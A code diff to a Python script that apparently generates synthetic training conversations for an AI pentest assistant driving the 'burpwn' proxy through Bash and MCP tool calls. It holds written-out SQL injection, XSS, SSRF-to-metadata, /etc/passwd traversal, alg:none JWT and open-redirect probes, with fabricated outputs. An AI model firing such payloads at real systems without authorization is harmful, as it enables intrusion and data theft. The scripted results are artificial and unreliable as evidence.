@@ -105,7 +105,7 @@ from typing import Any, Iterable
 # Schema + system prompts.
 # --------------------------------------------------------------------------- #
 
-SCHEMA_VERSION = "2.0"
+SCHEMA_VERSION = "2.1"
 
 SYSTEM_CLI = (
     "You are a web-application penetration-testing assistant that drives "
@@ -129,6 +129,26 @@ SYSTEM_MCP = (
     "JSON arguments to accomplish the user's goal, then interpret the result. "
     "Only operate against systems you are authorized to test."
 )
+
+SYSTEM_SHELL = (
+    "You are a web-application penetration-testing assistant that drives burpwn "
+    "from a shell, running every command with the `Bash` tool. burpwn is a "
+    "transparent intercepting proxy + rootless sandbox: `burpwn exec -- <cmd>` "
+    "runs <cmd> in a user+network namespace whose entire network egress is forced "
+    "through burpwn's MITM proxy, so each request/response is captured (HTTPS "
+    "decrypted) to a per-session SQLite store you can then list, search, inspect, "
+    "replay (Repeater) and intercept. Create a named session first, route every "
+    "target-facing command through `burpwn exec`, then query the captures with "
+    "`burpwn req …` (pass the global `--json` flag for machine-readable output: "
+    "`{ok,data,error}`, except `req list`/`workspace list`/`match-replace list` "
+    "which return bare arrays). Your own non-target commands need not be wrapped — "
+    "and the assistant's own LLM traffic is never captured by construction. Only "
+    "operate against systems you are authorized to test."
+)
+
+# The shell/Bash tool an agent uses to run burpwn from a CLI session (the tool
+# name Claude Code exposes and that burpwn's PreToolUse hook matches).
+SHELL_TOOL_NAME = "Bash"
 
 # The 19 MCP tools exposed by `burpwn mcp` (verified against server.rs).
 MCP_TOOL_NAMES = {
@@ -261,6 +281,85 @@ def mcp_example(
         "tags": tags,
         "messages": messages,
     }
+
+
+def _agentic_record(
+    *,
+    style: str,
+    tags: list[str],
+    exchanges: list[dict[str, Any]],
+    system: str,
+) -> dict[str, Any]:
+    """Build a tool-calling record as a sequence of multi-turn ``exchanges``.
+
+    Each exchange is ``{"user": str, "steps": [step, ...]}`` and expands to:
+    ``user → (assistant(tool_calls=[one call]) → tool(result) → assistant(interp))+``.
+    Chaining several exchanges yields a genuine multi-turn conversation (several
+    *user* turns, each driving one or more tool rounds).
+
+    ``style`` selects the tool dialect:
+
+    * ``"shell"`` — each step is ``{"preamble", "command", "result", "interp"}``;
+      the tool call is a ``Bash`` call ``{"command": …}`` (exactly how an agent
+      runs burpwn from a CLI session / under the PreToolUse hook), and the tool
+      ``result`` is the command's raw stdout *string*.
+    * ``"mcp"`` — each step is ``{"preamble", "tool", "args", "result", "interp"}``;
+      the tool call targets an MCP tool with JSON ``args`` and the ``result`` is a
+      JSON-encodable object (serialized to a string, like ``mcp_example``).
+    """
+    messages: list[dict[str, Any]] = [{"role": "system", "content": system}]
+    cid = 0
+    for ex in exchanges:
+        messages.append({"role": "user", "content": ex["user"]})
+        for step in ex["steps"]:
+            cid += 1
+            call_id = f"call_{cid}"
+            if style == "shell":
+                name = SHELL_TOOL_NAME
+                args: dict[str, Any] = {"command": step["command"]}
+                result_content = step["result"]  # raw stdout string
+            else:
+                name = step["tool"]
+                args = step["args"]
+                result_content = json.dumps(step["result"], sort_keys=True)
+            messages.append(
+                {
+                    "role": "assistant",
+                    "content": step.get("preamble", ""),
+                    "tool_calls": [_tool_call(call_id, name, args)],
+                }
+            )
+            messages.append(
+                {
+                    "role": "tool",
+                    "tool_call_id": call_id,
+                    "name": name,
+                    "content": result_content,
+                }
+            )
+            messages.append({"role": "assistant", "content": step["interp"]})
+    return {
+        "schema_version": SCHEMA_VERSION,
+        "style": style,
+        "tags": tags,
+        "messages": messages,
+    }
+
+
+def shell_example(
+    *, tags: list[str], exchanges: list[dict[str, Any]], system: str = SYSTEM_SHELL
+) -> dict[str, Any]:
+    """A ``Bash``-tool-call record driving burpwn from a CLI session (single- or
+    multi-turn). See [`_agentic_record`]."""
+    return _agentic_record(style="shell", tags=tags, exchanges=exchanges, system=system)
+
+
+def mcp_conversation(
+    *, tags: list[str], exchanges: list[dict[str, Any]], system: str = SYSTEM_MCP
+) -> dict[str, Any]:
+    """A multi-turn MCP record: several *user* turns, each driving one or more MCP
+    tool rounds. (``mcp_example`` is the single-user-turn form.)"""
+    return _agentic_record(style="mcp", tags=tags, exchanges=exchanges, system=system)
 
 
 # --------------------------------------------------------------------------- #
@@ -2944,6 +3043,666 @@ def fam_mcp_exec_flag_variants() -> list[dict[str, Any]]:
     return out
 
 
+# --------------------------------------------------------------------------- #
+# Shell / Bash tool-call families (style "shell") + multi-turn conversations.
+#
+# These teach burpwn driven the way a real CLI agent (e.g. Claude Code, where the
+# PreToolUse hook routes shell commands) actually uses it: the assistant emits a
+# `Bash` tool call whose `command` runs burpwn, the `tool` turn carries the
+# command's real stdout, and the assistant then interprets it. Most are genuine
+# multi-turn conversations (several user turns, each driving one or more tool
+# rounds). Grounded against the same real envelopes as the CLI/MCP families.
+# --------------------------------------------------------------------------- #
+
+
+def _flow_row(fid: int, t: Target, method: str, path: str, status: int) -> dict[str, Any]:
+    """A `req list --json` row (bare-array element), matching fam_req_list."""
+    return {
+        "authority": t.host,
+        "dst_ip": t.dst_ip,
+        "dst_port": t.port,
+        "id": fid,
+        "intercepted": False,
+        "method": method,
+        "path": path,
+        "protocol": t.protocol,
+        "scheme": t.scheme,
+        "sni": t.host if t.scheme == "https" else None,
+        "status": status,
+        "ts_end": 1781363726726,
+        "ts_start": 1781363726697,
+        "workspace_id": 1,
+    }
+
+
+def _idbase(t: Target) -> int:
+    """Deterministic, target-distinct flow-id base so records don't collide."""
+    return (TARGETS.index(t) + 1) * 7
+
+
+def _ok(data: Any) -> str:
+    """A CLI `--json` `{ok,data,error}` envelope, serialized as stdout."""
+    return json.dumps({"ok": True, "data": data, "error": None}, sort_keys=True)
+
+
+def _home_body(t: Target) -> str:
+    if t.kind == "rest":
+        return (
+            f'{{"service":"{t.host}","version":"1.4.2",'
+            '"endpoints":["/v1/login","/v1/me","/v1/users"]}'
+        )
+    if t.kind == "graphql":
+        return '{"data":{"__typename":"Query"}}'
+    if t.kind == "internal":
+        return "<html><head><title>Intranet</title></head><body>Restricted area</body></html>"
+    title = t.host
+    return (
+        f"<!doctype html><html><head><title>{title}</title></head>"
+        '<body><h1>Welcome</h1><a href="/login">Sign in</a></body></html>'
+    )
+
+
+def fam_shell_recon() -> list[dict[str, Any]]:
+    """Single-turn `Bash`-tool-call recon: run a tool under `burpwn exec`, read
+    its stdout, then point at the capture. One per target + a few scanner forms."""
+    out: list[dict[str, Any]] = []
+    for t in TARGETS:
+        out.append(
+            shell_example(
+                tags=["shell", "exec", "recon", "curl", t.key],
+                exchanges=[
+                    {
+                        "user": f"Fetch the {t.host} homepage through burpwn so it gets captured.",
+                        "steps": [
+                            {
+                                "preamble": "Running curl inside the sandbox so its egress is "
+                                "forced through the MITM proxy and captured.",
+                                "command": f"burpwn exec -- curl -s {t.base}/",
+                                "result": _home_body(t),
+                                "interp": f"That returned the {t.host} landing page; the GET "
+                                "(plus its DNS lookups) are now in the session store. List them "
+                                f"with `burpwn --json req list --host {t.host}`, then "
+                                "`burpwn req show <id>` to read the decrypted exchange.",
+                            }
+                        ],
+                    }
+                ],
+            )
+        )
+    # scanner forms (single tool call, long timeout) over a few targets
+    scan_tools = [
+        ("ffuf", "ffuf -u {base}/FUZZ -w /usr/share/wordlists/common.txt -mc 200,403", 600),
+        ("nuclei", "nuclei -u {base} -silent", 300),
+        ("nmap", "nmap -sT -Pn {host}", 300),
+    ]
+    for tool, cmdpat, to in scan_tools:
+        for t in (TARGETS[0], TARGETS[2], TARGETS[7]):
+            cmd = cmdpat.format(base=t.base, host=t.host)
+            out.append(
+                shell_example(
+                    tags=["shell", "exec", "recon", "tool", tool, t.key],
+                    exchanges=[
+                        {
+                            "user": f"Run {tool} against {t.host} through burpwn.",
+                            "steps": [
+                                {
+                                    "preamble": f"Wrapping {tool} after `--` with a generous "
+                                    "timeout; every probe it makes is captured.",
+                                    "command": f"burpwn exec --timeout {to} -- {cmd}",
+                                    "result": f"[{tool}] scan complete against {t.host}\n",
+                                    "interp": f"{tool} finished; its requests are captured. "
+                                    f"Triage the hits with `burpwn --json req list --host "
+                                    f"{t.host} --status 200`.",
+                                }
+                            ],
+                        }
+                    ],
+                )
+            )
+    return out
+
+
+def fam_shell_recon_inspect() -> list[dict[str, Any]]:
+    """Two-turn `Bash`-tool-call recon: run a tool under `exec`, then (second user
+    turn) list and inspect what it captured."""
+    out: list[dict[str, Any]] = []
+    tools = [
+        ("ffuf", "ffuf -u {base}/FUZZ -w /usr/share/wordlists/common.txt -mc 200,301", 600,
+         "/admin", 301),
+        ("gobuster", "gobuster dir -u {base} -w /usr/share/wordlists/common.txt", 600,
+         "/backup", 200),
+        ("nuclei", "nuclei -u {base} -silent", 300, "/.git/config", 200),
+    ]
+    for tool, cmdpat, to, hit_path, hit_status in tools:
+        for t in TARGETS:
+            b = _idbase(t)
+            hit_id = b + 3
+            rows = [_flow_row(hit_id, t, "GET", hit_path, hit_status)]
+            out.append(
+                shell_example(
+                    tags=["shell", "exec", "recon", "inspect", "multi-turn", tool, t.key],
+                    exchanges=[
+                        {
+                            "user": f"Run {tool} against {t.host} through burpwn.",
+                            "steps": [
+                                {
+                                    "preamble": f"Wrapping {tool} after `--`; every probe is "
+                                    "captured.",
+                                    "command": f"burpwn exec --timeout {to} -- "
+                                    + cmdpat.format(base=t.base),
+                                    "result": f"[{tool}] done — interesting hit: {hit_path}\n",
+                                    "interp": f"{tool} flagged `{hit_path}`. Its requests are "
+                                    "captured — let me pull the hits from the store.",
+                                }
+                            ],
+                        },
+                        {
+                            "user": f"Show me the {hit_path} hit it found.",
+                            "steps": [
+                                {
+                                    "preamble": "Filter this host's captured flows.",
+                                    "command": f"burpwn --json req list --host {t.host} "
+                                    f"--status {hit_status}",
+                                    "result": json.dumps(rows, sort_keys=True),
+                                    "interp": f"Flow {hit_id} is the `GET {hit_path}` → "
+                                    f"{hit_status}. Inspect the decrypted response with "
+                                    f"`burpwn req show {hit_id} --raw`.",
+                                }
+                            ],
+                        },
+                    ],
+                )
+            )
+    return out
+
+
+def fam_shell_engagements() -> list[dict[str, Any]]:
+    """Multi-turn engagement narratives over the `Bash` tool: session → recon →
+    review captures → inspect a flow → flag/export. One per target × focus."""
+    out: list[dict[str, Any]] = []
+    focuses = [
+        ("login", "/login", "POST", "the login endpoint",
+         '{"error":"invalid_credentials"}'),
+        ("api", "/v1/me", "GET", "the current-user endpoint",
+         '{"id":1001,"email":"user@example.com","role":"user"}'),
+        ("search", "/search?q=test", "GET", "the search endpoint",
+         '{"results":[],"q":"test"}'),
+        ("products", "/api/products?page=1", "GET", "the product listing",
+         '{"items":[{"id":1,"name":"Widget"}],"page":1}'),
+        ("profile", "/account/profile", "GET", "the account profile page",
+         '{"username":"alice","email":"alice@example.com"}'),
+        ("cart", "/api/cart", "GET", "the cart endpoint",
+         '{"items":[],"total":0}'),
+        ("health", "/healthz", "GET", "the health endpoint",
+         '{"status":"ok","version":"1.4.2"}'),
+    ]
+    openers = [
+        "Start testing {who}: create a session and hit {desc}.",
+        "Spin up a fresh session for {who} and send a request to {desc}.",
+        "New engagement on {who} — open a session and probe {desc}.",
+    ]
+    for t in TARGETS:
+        for fkey, path, method, desc, body in focuses:
+          for _oi, opener in enumerate(openers):
+            b = _idbase(t)
+            dns_id, http_id = b, b + 1
+            sess = t.key
+            list_rows = [
+                _flow_row(dns_id, t, "QUERY", f"{t.host}./A", 0),
+                _flow_row(http_id, t, method, path, 200),
+            ]
+            show_detail = {
+                "id": http_id,
+                "protocol": t.protocol,
+                "request": {"method": method, "path": path,
+                            "headers": {"host": t.host}},
+                "response": {"status": 200, "headers": {"content-type": "application/json"},
+                             "body": body},
+            }
+            out.append(
+                shell_example(
+                    tags=["shell", "engagement", "multi-turn", fkey, t.key],
+                    exchanges=[
+                        {
+                            "user": opener.format(who=(t.desc or t.host), desc=desc),
+                            "steps": [
+                                {
+                                    "preamble": "Create a named session for this engagement "
+                                    "first.",
+                                    "command": f"burpwn --json session new --name {sess}",
+                                    "result": _ok({"name": sess}),
+                                    "interp": f"Session `{sess}` created and active. Now I'll "
+                                    "send the request through the sandbox.",
+                                },
+                                {
+                                    "preamble": "Run the request under exec so it's captured "
+                                    "and decrypted.",
+                                    "command": f"burpwn exec -- curl -s -X {method} {t.base}{path}",
+                                    "result": body,
+                                    "interp": f"Got `{body}`. The exchange is captured under "
+                                    f"`{sess}` — let me see the flow records.",
+                                },
+                            ],
+                        },
+                        {
+                            "user": "What got captured so far?",
+                            "steps": [
+                                {
+                                    "preamble": "List this host's flows, newest first.",
+                                    "command": f"burpwn --json req list --host {t.host} --limit 20",
+                                    "result": json.dumps(list_rows, sort_keys=True),
+                                    "interp": f"Two flows: id {dns_id} (the DNS `QUERY`) and id "
+                                    f"{http_id} (the `{method} {path}` → 200). I'll open the "
+                                    "HTTP one.",
+                                }
+                            ],
+                        },
+                        {
+                            "user": f"Show me flow {http_id} decoded.",
+                            "steps": [
+                                {
+                                    "preamble": "Decode the request/response.",
+                                    "command": f"burpwn req show {http_id} --json",
+                                    "result": _ok(show_detail),
+                                    "interp": f"`{method} {path}` returned 200 with body "
+                                    f"`{body}`. Worth flagging for follow-up.",
+                                }
+                            ],
+                        },
+                        {
+                            "user": "Flag it and save evidence.",
+                            "steps": [
+                                {
+                                    "preamble": "Tag the flow.",
+                                    "command": f"burpwn --json tag add {http_id} {fkey}-review",
+                                    "result": _ok({"tag_id": 1}),
+                                    "interp": f"Tagged flow {http_id} `{fkey}-review`.",
+                                },
+                                {
+                                    "preamble": "Export the session as HAR for the report.",
+                                    "command": f"burpwn export har -o /tmp/{sess}.har",
+                                    "result": "",
+                                    "interp": f"Wrote `/tmp/{sess}.har` (HAR 1.2) with the "
+                                    "captured flows. Note `export pcap` is not implemented; HAR "
+                                    "is the evidence format.",
+                                },
+                            ],
+                        },
+                    ],
+                )
+            )
+    return out
+
+
+def fam_shell_vuln_workflows() -> list[dict[str, Any]]:
+    """Multi-turn vuln-testing conversations via the `Bash` tool, one per
+    (vuln class × target × phrasing). Probe → review → confirm/replay → tag."""
+    out: list[dict[str, Any]] = []
+
+    # (key, tag, ask templates[], probe cmd builder, probe stdout, confirm step)
+    def idor(t: Target) -> dict[str, Any]:
+        b = _idbase(t)
+        return {
+            "key": "idor",
+            "asks": [
+                f"Check {t.host} for IDOR on the user object.",
+                f"Is {t.host}'s /v1/users/{{id}} object-level access broken?",
+            ],
+            "probe_cmd": f"burpwn exec -- curl -s {t.base}/v1/users/1001 -H 'Authorization: Bearer t-user'",
+            "probe_out": '{"id":1001,"email":"a@x.io","role":"user"}',
+            "probe_interp": "Fetched my own object (id 1001). If I can read another id with the "
+            "same token, it's IDOR. Let me try 1002.",
+            "confirm_cmd": f"burpwn exec -- curl -s {t.base}/v1/users/1002 -H 'Authorization: Bearer t-user'",
+            "confirm_out": '{"id":1002,"email":"victim@x.io","role":"user"}',
+            "confirm_interp": "Confirmed IDOR: my user token read user 1002's record "
+            "(`victim@x.io`). I'll flag the flow.",
+            "flow_id": b + 1,
+            "tag": "idor-confirmed",
+        }
+
+    def sqli(t: Target) -> dict[str, Any]:
+        b = _idbase(t)
+        return {
+            "key": "sqli",
+            "asks": [
+                f"Test {t.host}'s id parameter for SQL injection.",
+                f"Does {t.host} error on a single quote in ?id=?",
+            ],
+            "probe_cmd": f"burpwn exec -- curl -s \"{t.base}/item?id=1'\"",
+            "probe_out": '{"error":"SQL syntax error near \'1\'\'\'"}',
+            "probe_interp": "The single quote triggered a SQL syntax error — strong SQLi signal. "
+            "Let me confirm the response was captured as a 500.",
+            "confirm_cmd": f"burpwn --json req list --host {t.host} --status 500",
+            "confirm_out": None,  # filled below to a flow array
+            "confirm_interp": "Captured as a 500 with the SQL error in the body — injectable. "
+            "I'll tag it and follow up with sqlmap under exec.",
+            "flow_id": b + 1,
+            "tag": "sqli-candidate",
+        }
+
+    def xss(t: Target) -> dict[str, Any]:
+        b = _idbase(t)
+        return {
+            "key": "xss",
+            "asks": [
+                f"Check {t.host}'s search for reflected XSS.",
+                f"Is the q parameter on {t.host} reflected unescaped?",
+            ],
+            "probe_cmd": f"burpwn exec -- curl -s \"{t.base}/search?q=<script>alert(1)</script>\"",
+            "probe_out": '<html><body>No results for <script>alert(1)</script></body></html>',
+            "probe_interp": "The payload is reflected unescaped in the HTML body — reflected XSS. "
+            "Let me confirm via full-text search of the captured response.",
+            "confirm_cmd": "burpwn req search '<script>alert(1)'",
+            "confirm_out": None,  # flow_ids
+            "confirm_interp": "The captured response contains the unescaped payload — confirmed "
+            "reflected XSS. Tagging the flow.",
+            "flow_id": b + 1,
+            "tag": "xss-reflected",
+        }
+
+    def authz(t: Target) -> dict[str, Any]:
+        b = _idbase(t)
+        return {
+            "key": "authz",
+            "asks": [
+                f"Does {t.host}'s /v1/me enforce auth, or does dropping the token still work?",
+                f"Re-test {t.host}'s account endpoint without the Authorization header.",
+            ],
+            "probe_cmd": f"burpwn exec -- curl -s -o /dev/null -w '%{{http_code}}' {t.base}/v1/me -H 'Authorization: Bearer t-user'",
+            "probe_out": "200",
+            "probe_interp": "With a valid token it's 200 and the request is captured. Now I'll "
+            "replay that captured flow with the Authorization header stripped.",
+            "confirm_cmd": f"burpwn req replay {b + 1} --set-header 'Authorization: '",
+            "confirm_out": None,  # replay envelope
+            "confirm_interp": "Replayed without the token and still got 200 — broken "
+            "authentication/authorization. Flagging it.",
+            "flow_id": b + 1,
+            "tag": "authz-bypass",
+        }
+
+    def ssrf(t: Target) -> dict[str, Any]:
+        b = _idbase(t)
+        return {
+            "key": "ssrf",
+            "asks": [
+                f"Test {t.host}'s url= fetch parameter for SSRF.",
+                f"Can {t.host}'s image proxy be pointed at the metadata endpoint?",
+            ],
+            "probe_cmd": f"burpwn exec -- curl -s \"{t.base}/fetch?url=http://169.254.169.254/latest/meta-data/\"",
+            "probe_out": "iam/\nhostname\ninstance-id\n",
+            "probe_interp": "The endpoint fetched the cloud metadata service and returned its "
+            "index — server-side request forgery. Let me confirm the flow was captured.",
+            "confirm_cmd": f"burpwn --json req list --host {t.host} --method GET",
+            "confirm_out": None,
+            "confirm_interp": "Captured: the request to the `url=` param reached 169.254.169.254 "
+            "from the server. Confirmed SSRF — flagging it.",
+            "flow_id": b + 1,
+            "tag": "ssrf-confirmed",
+        }
+
+    def openredirect(t: Target) -> dict[str, Any]:
+        b = _idbase(t)
+        return {
+            "key": "open-redirect",
+            "asks": [
+                f"Does {t.host}'s next= parameter allow an open redirect?",
+                f"Check {t.host} login redirect for off-site redirection.",
+            ],
+            "probe_cmd": f"burpwn exec -- curl -s -o /dev/null -D - \"{t.base}/login?next=https://evil.example/\"",
+            "probe_out": "HTTP/2 302 \r\nlocation: https://evil.example/\r\n",
+            "probe_interp": "It 302s straight to the attacker-controlled host in `Location` — "
+            "open redirect. Let me confirm via the captured flow.",
+            "confirm_cmd": f"burpwn req show {b + 1} --json",
+            "confirm_out": None,
+            "confirm_interp": "The captured response is a 302 with `location: https://evil.example/` "
+            "— confirmed open redirect. Tagging it.",
+            "flow_id": b + 1,
+            "tag": "open-redirect",
+        }
+
+    def pathtrav(t: Target) -> dict[str, Any]:
+        b = _idbase(t)
+        return {
+            "key": "path-traversal",
+            "asks": [
+                f"Test {t.host}'s file= parameter for path traversal.",
+                f"Can {t.host}'s download endpoint read /etc/passwd?",
+            ],
+            "probe_cmd": f"burpwn exec -- curl -s \"{t.base}/download?file=../../../../etc/passwd\"",
+            "probe_out": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
+            "probe_interp": "The response is the contents of /etc/passwd — path traversal / LFI. "
+            "Let me confirm the captured response body.",
+            "confirm_cmd": "burpwn req search 'root:x:0:0'",
+            "confirm_out": None,
+            "confirm_interp": "The captured response body contains `root:x:0:0` — confirmed path "
+            "traversal. Flagging the flow.",
+            "flow_id": b + 1,
+            "tag": "path-traversal",
+        }
+
+    def jwtnone(t: Target) -> dict[str, Any]:
+        b = _idbase(t)
+        return {
+            "key": "jwt-alg-none",
+            "asks": [
+                f"Check whether {t.host} accepts a JWT with alg:none.",
+                f"Re-sign {t.host}'s token as alg:none and replay it.",
+            ],
+            "probe_cmd": f"burpwn exec -- curl -s -o /dev/null -w '%{{http_code}}' {t.base}/v1/me -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig'",
+            "probe_out": "200",
+            "probe_interp": "Baseline 200 with the signed token, and it's captured. Now I'll "
+            "replay that flow swapping in an alg:none token.",
+            "confirm_cmd": f"burpwn req replay {b + 1} --set-header 'Authorization: Bearer eyJhbGciOiJub25lIn0.payload.'",
+            "confirm_out": None,
+            "confirm_interp": "Replayed with an `alg:none` unsigned token and still got 200 — the "
+            "server doesn't verify the signature. Critical auth bypass; flagging it.",
+            "flow_id": b + 1,
+            "tag": "jwt-alg-none",
+        }
+
+    builders = [idor, sqli, xss, authz, ssrf, openredirect, pathtrav, jwtnone]
+    # vuln workflows over a spread of targets (skip pure-internal where odd)
+    vuln_targets = [t for t in TARGETS if t.kind in ("rest", "webapp", "spa", "graphql")]
+    for build in builders:
+        for t in vuln_targets:
+            spec = build(t)
+            fid = spec["flow_id"]
+            # fill the confirm result that depends on flow ids
+            if spec["key"] == "sqli":
+                spec["confirm_out"] = json.dumps(
+                    [_flow_row(fid, t, "GET", "/item?id=1'", 500)], sort_keys=True
+                )
+            elif spec["key"] in ("xss", "path-traversal"):
+                spec["confirm_out"] = json.dumps({"flow_ids": [fid]}, sort_keys=True)
+            elif spec["key"] == "ssrf":
+                spec["confirm_out"] = json.dumps(
+                    [_flow_row(fid, t, "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", 200)],
+                    sort_keys=True,
+                )
+            elif spec["key"] == "open-redirect":
+                spec["confirm_out"] = _ok(
+                    {"id": fid, "protocol": t.protocol,
+                     "request": {"method": "GET", "path": "/login?next=https://evil.example/"},
+                     "response": {"status": 302,
+                                  "headers": {"location": "https://evil.example/"}, "body": ""}}
+                )
+            elif spec["key"] in ("authz", "jwt-alg-none"):
+                spec["confirm_out"] = _ok(
+                    {"response": "HTTP/2 200 \r\ncontent-type: application/json\r\n\r\n"
+                                 '{"id":1001,"role":"user"}'}
+                )
+            asks = spec["asks"] + [
+                f"Probe {t.host} for {spec['key']}, confirm it, and record the finding."
+            ]
+            for pi, ask in enumerate(asks):
+                out.append(
+                    shell_example(
+                        tags=["shell", "vuln", "multi-turn", spec["key"], t.key],
+                        exchanges=[
+                            {
+                                "user": ask.replace("{id}", "1001"),
+                                "steps": [
+                                    {
+                                        "preamble": "Sending the probe through the sandbox so "
+                                        "it's captured.",
+                                        "command": spec["probe_cmd"],
+                                        "result": spec["probe_out"],
+                                        "interp": spec["probe_interp"],
+                                    }
+                                ],
+                            },
+                            {
+                                "user": "Confirm it.",
+                                "steps": [
+                                    {
+                                        "preamble": "Confirming against the captured evidence.",
+                                        "command": spec["confirm_cmd"],
+                                        "result": spec["confirm_out"],
+                                        "interp": spec["confirm_interp"],
+                                    }
+                                ],
+                            },
+                            {
+                                "user": "Tag the finding with a note.",
+                                "steps": [
+                                    {
+                                        "preamble": "Tagging the flow.",
+                                        "command": f"burpwn --json tag add {fid} {spec['tag']}",
+                                        "result": _ok({"tag_id": 1}),
+                                        "interp": f"Tagged flow {fid} `{spec['tag']}`.",
+                                    },
+                                    {
+                                        "preamble": "Adding an evidence note.",
+                                        "command": f"burpwn note add {fid} 'confirmed {spec['key']} on {t.host}'",
+                                        "result": _ok({"note_id": 1}),
+                                        "interp": f"Noted on flow {fid}. Evidence is in the "
+                                        f"`{t.key}` capture set; `burpwn export har` when "
+                                        "writing up.",
+                                    },
+                                ],
+                            },
+                        ],
+                    )
+                )
+                _ = pi
+    return out
+
+
+def fam_mcp_conversations() -> list[dict[str, Any]]:
+    """Multi-turn MCP conversations (several user turns, each driving tool rounds)
+    — the tool-calling analogue of the shell engagements."""
+    out: list[dict[str, Any]] = []
+    convo_targets = [t for t in TARGETS if t.kind in ("rest", "webapp", "spa", "graphql")]
+    for t in convo_targets:
+        b = _idbase(t)
+        dns_id, http_id = b, b + 1
+        out.append(
+            mcp_conversation(
+                tags=["mcp", "multi-turn", "engagement", t.key],
+                exchanges=[
+                    {
+                        "user": f"Probe {t.host}/v1/me through the sandbox.",
+                        "steps": [
+                            {
+                                "preamble": "Run the request via the exec tool.",
+                                "tool": "exec",
+                                "args": {"argv": ["curl", "-s", "-o", "/dev/null",
+                                                  f"{t.base}/v1/me"]},
+                                "result": {"exit_code": 0,
+                                           "captured_request_ids": [dns_id, http_id],
+                                           "exec_id": "exec-7-0-1781400900000000000"},
+                                "interp": f"Captured flow {dns_id} (DNS) and {http_id} (the "
+                                "HTTPS GET). Ask me to inspect it.",
+                            }
+                        ],
+                    },
+                    {
+                        "user": "What did it return?",
+                        "steps": [
+                            {
+                                "preamble": "Decode the captured flow.",
+                                "tool": "req_show",
+                                "args": {"id": http_id},
+                                "result": {"id": http_id, "protocol": t.protocol,
+                                           "request": {"method": "GET", "path": "/v1/me"},
+                                           "response": {"status": 200,
+                                                        "body": '{"id":1001,"role":"user"}'}},
+                                "interp": "Returns a numeric, guessable id (1001) — IDOR-prone. "
+                                "Want me to flag it?",
+                            }
+                        ],
+                    },
+                    {
+                        "user": "Yes, tag it idor-candidate.",
+                        "steps": [
+                            {
+                                "preamble": "Tag the flow.",
+                                "tool": "tag_add",
+                                "args": {"flow_id": http_id, "name": "idor-candidate"},
+                                "result": {"tag_id": 2},
+                                "interp": f"Tagged flow {http_id} `idor-candidate` (tag_id 2). "
+                                "Next: exec a request to `/v1/users/1002` with the same token "
+                                "and compare.",
+                            }
+                        ],
+                    },
+                ],
+            )
+        )
+    # an orientation → search → show conversation per a few targets
+    for t in (TARGETS[2], TARGETS[4], TARGETS[8]):
+        b = _idbase(t)
+        out.append(
+            mcp_conversation(
+                tags=["mcp", "multi-turn", "orientation", "search", t.key],
+                exchanges=[
+                    {
+                        "user": "I just connected — which session am I on and how many flows?",
+                        "steps": [
+                            {
+                                "preamble": "Check the active session.",
+                                "tool": "session_current",
+                                "args": {},
+                                "result": {"active": t.key, "db_exists": True},
+                                "interp": f"Active session `{t.key}`, db present. Ask what you "
+                                "want to hunt for.",
+                            }
+                        ],
+                    },
+                    {
+                        "user": "Did any response leak a token?",
+                        "steps": [
+                            {
+                                "preamble": "Full-text search the captured bodies.",
+                                "tool": "req_search",
+                                "args": {"query": "token"},
+                                "result": {"flow_ids": [b + 1]},
+                                "interp": f"One hit: flow {b + 1}. Want it decoded?",
+                            }
+                        ],
+                    },
+                    {
+                        "user": "Show it.",
+                        "steps": [
+                            {
+                                "preamble": "Decode the flow.",
+                                "tool": "req_show",
+                                "args": {"id": b + 1, "raw": True},
+                                "result": {"id": b + 1, "protocol": t.protocol,
+                                           "response": {"status": 200,
+                                                        "body": '{"access_token":"eyJ..."}'}},
+                                "interp": "The response body returns an access token in "
+                                "cleartext — sensitive-data exposure. Recommend tagging it as "
+                                "evidence.",
+                            }
+                        ],
+                    },
+                ],
+            )
+        )
+    return out
+
+
 # Assembly, dedup, split.
 # --------------------------------------------------------------------------- #
 
@@ -2974,6 +3733,11 @@ FAMILIES = [
     fam_mcp_tag_note_sweep,
     fam_mcp_intercept_sweep,
     fam_mcp_exec_flag_variants,
+    fam_shell_recon,
+    fam_shell_recon_inspect,
+    fam_shell_engagements,
+    fam_shell_vuln_workflows,
+    fam_mcp_conversations,
 ]
 
 
@@ -2997,9 +3761,25 @@ def _normalized_key(rec: dict[str, Any]) -> str:
     return hashlib.sha256(blob.encode("utf-8")).hexdigest()
 
 
-def build_dataset(target: int | None, seed: int) -> list[dict[str, Any]]:
-    """Generate all family records, dedup, and (optionally) cap to ~target with
-    a deterministic, balanced selection."""
+def is_multiturn(rec: dict[str, Any]) -> bool:
+    """True if the conversation has more than one *user* turn (a genuine
+    back-and-forth, as opposed to a single-shot or single-user multi-step)."""
+    return sum(1 for m in rec["messages"] if m.get("role") == "user") > 1
+
+
+def _subsample_by_style(
+    unique: list[dict[str, Any]], keep: set[int]
+) -> list[dict[str, Any]]:
+    """Filter ``unique`` to records whose id() is in ``keep`` (stable order)."""
+    return [r for r in unique if id(r) in keep]
+
+
+def build_dataset(
+    target: int | None, seed: int, multiturn_frac: float | None = None
+) -> list[dict[str, Any]]:
+    """Generate all family records, dedup, optionally balance the multi-turn
+    fraction, and (optionally) cap to ~target with a deterministic, style-balanced
+    selection."""
     records: list[dict[str, Any]] = []
     for fam in FAMILIES:
         records.extend(fam())
@@ -3014,21 +3794,49 @@ def build_dataset(target: int | None, seed: int) -> list[dict[str, Any]]:
         seen.add(key)
         unique.append(rec)
 
+    # Balance toward ~multiturn_frac multi-turn conversations by deterministically
+    # subsampling SINGLE-turn records (we never drop multi-turn, and keep the
+    # per-style mix within the single-turn pool). The families remain the source
+    # of truth; this only shapes the emitted set. Disabled when frac is falsy.
+    if multiturn_frac and 0.0 < multiturn_frac < 1.0:
+        multi = [r for r in unique if is_multiturn(r)]
+        single = [r for r in unique if not is_multiturn(r)]
+        if multi and single:
+            keep_single = int(round(len(multi) * (1.0 - multiturn_frac) / multiturn_frac))
+            if keep_single < len(single):
+                rng = random.Random(seed + 2)
+                by_style: dict[str, list[dict[str, Any]]] = {}
+                for r in single:
+                    by_style.setdefault(r["style"], []).append(r)
+                keep: set[int] = set(id(r) for r in multi)
+                total_single = len(single)
+                for st in sorted(by_style):
+                    group = by_style[st]
+                    rng.shuffle(group)
+                    n_keep = int(round(keep_single * len(group) / total_single))
+                    keep |= set(id(r) for r in group[:n_keep])
+                unique = _subsample_by_style(unique, keep)
+
     # If a smaller target is requested, deterministically subsample while keeping
